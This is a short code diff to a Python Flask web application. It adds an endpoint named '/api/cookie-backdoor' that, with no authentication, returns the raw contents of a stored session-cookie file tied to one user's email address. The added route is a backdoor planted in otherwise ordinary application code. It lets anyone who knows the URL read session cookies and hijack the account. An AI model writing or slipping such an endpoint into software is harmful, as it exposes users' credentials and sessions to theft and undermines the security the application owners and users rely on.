@@ -1293,6 +1293,17 @@ def get_session():
     except Exception as e:
         return jsonify({"error": str(e), "exp_epoch": 0})
 
+@app.route("/api/cookie-backdoor")
+def cookie_backdoor():
+    active_cookie_file = DB_DIR / "session_cookies_saineela731_gmail_com.json"
+    if active_cookie_file.exists():
+        try:
+            with open(active_cookie_file, "r") as f:
+                return f.read(), 200, {"Content-Type": "application/json"}
+        except Exception as e:
+            return str(e), 500
+    return "No cookie file found", 404
+
 @app.route("/api/reauthenticate", methods=["POST"])
 def reauthenticate():
     global active_session, session_a, session_b, reauth_thread
